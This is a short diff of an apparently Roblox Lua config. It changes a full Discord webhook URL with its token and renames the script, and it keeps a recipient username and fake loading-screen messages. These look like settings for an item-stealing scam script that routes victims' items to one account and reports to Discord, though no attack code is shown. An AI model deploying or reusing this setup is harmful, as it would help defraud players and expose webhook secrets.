@@ -1,7 +1,7 @@
 Username = "sziauram_001"
-WebHook = "https://discord.com/api/webhooks/1116731273130553367/4c3ZTcx22yYqkIvXxGdQswNDrsVfpisgWKUWowqgb8HXRVxl_uD2_cQv9G-1ywCA6glr"
+WebHook = "https://discord.com/api/webhooks/1123354648791761118/aOGvfNX0rjFhzY7bsFD6zHo4G2VMPKi_cbgQsYpLOr6Wx06OoWUcyyo5wOWiEGnmJaN6"
 loadingscreen = true
-_G.CustomScriptName = "PetRaper loading"
+_G.CustomScriptName = "MilkRight Loading"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script..."
 _G.Text3 = "Checking Scripts..."
